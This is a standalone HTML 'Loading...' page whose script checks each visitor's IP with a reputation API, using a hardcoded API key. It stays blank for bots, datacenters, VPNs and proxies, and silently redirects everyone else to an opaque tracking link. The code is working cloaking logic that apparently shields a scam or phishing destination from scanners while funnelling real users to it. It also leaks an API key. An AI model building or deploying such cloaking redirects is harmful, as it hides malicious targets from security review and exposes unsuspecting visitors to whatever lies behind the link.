<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: var(--bg-color);
      color: var(--text-color);
      transition: background 0.3s, color 0.3s;
    }

    :root {
      --bg-color: #ffffff;
      --text-color: #222222;
      --spinner-color: #ff3b30;
      --spinner-bg: rgba(0,0,0,0.08);
    }

    @media (prefers-color-scheme: dark) {
      :root {
        --bg-color: #0e0e0e;
        --text-color: #f2f2f2;
        --spinner-color: #ff453a;
        --spinner-bg: rgba(255,255,255,0.1);
      }
    }

    #c9-spinner-wrap {
      position: fixed;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 99999;
      background: var(--bg-color);
      transition: background 0.3s ease;
    }

    #c9-spinner {
      width: min(20vw, 80px);
      height: min(20vw, 80px);
      border-radius: 50%;
      border: 6px solid var(--spinner-bg);
      border-top: 6px solid var(--spinner-color);
      box-sizing: border-box;
      animation: c9-spin 1s linear infinite;
    }

    #c9-text {
      margin-top: 16px;
      color: var(--text-color);
      font-family: "Segoe UI", Arial, sans-serif;
      font-size: clamp(14px, 3vw, 18px);
      text-align: center;
    }

    @keyframes c9-spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Responsif tambahan */
    @media (min-width: 768px) {
      #c9-spinner { width: 60px; height: 60px; }
      #c9-text { font-size: 16px; }
    }

    @media (min-width: 1200px) {
      #c9-spinner { width: 80px; height: 80px; }
      #c9-text { font-size: 18px; }
    }
  </style>
</head>
<body>
<script>
(async () => {
  const TARGET_URL = "https://cloud.triggerla.com/go/a83453d5";
  const API_KEY = "9516c3e4-5fac-44cd-b3da-2007fd0918fb";

  try {
    const r = await fetch("https://api.ipdetective.io/ip?info=true", {
      headers: { "x-api-key": API_KEY, "Accept": "application/json" },
      cache: "no-store",
      credentials: "omit"
    });

    if (!r || !r.ok) return; // gagal → blank

    const j = await r.json().catch(() => ({}));
    const t = (j.type || "").toLowerCase();
    const isBot = j.bot === true || ["datacenter", "bot", "vpn", "proxy"].includes(t);
    if (isBot) return; // bot → tetap blank

    showSpinnerAndRedirect(TARGET_URL);
  } catch (e) {
    // error → blank
  }

  function showSpinnerAndRedirect(url) {
    const wrap = document.createElement('div');
    wrap.id = 'c9-spinner-wrap';

    const spinner = document.createElement('div');
    spinner.id = 'c9-spinner';

    const text = document.createElement('div');
    text.id = 'c9-text';
    text.textContent = 'Loading...';

    wrap.appendChild(spinner);
    wrap.appendChild(text);
    document.body.appendChild(wrap);

    setTimeout(() => {
      location.replace(url);
    }, 600);
  }
})();
</script>
</body>
</html>
